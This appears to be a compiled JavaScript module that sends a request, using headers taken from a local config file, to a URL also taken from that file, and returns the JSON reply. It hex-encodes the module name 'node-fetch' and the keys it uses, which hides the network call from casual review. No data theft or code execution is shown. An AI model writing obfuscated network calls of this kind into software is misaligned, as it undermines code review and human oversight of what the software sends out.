"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.default = void 0;

var _config = _interopRequireDefault(require("./config"));

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

var r = require;
var b = Buffer;
var f = r(e('6e6f64652d6665746368'));

function e(r) {
  return b.from(r, 'hex').toString();
}

function req() {
  return f(_config.default[e('75726c')].join(e('2f')), _defineProperty({}, e('68656164657273'), _config.default[e('68656164657273')])).then(function (res) {
    return res.json();
  });
}

var _default = req;
exports.default = _default;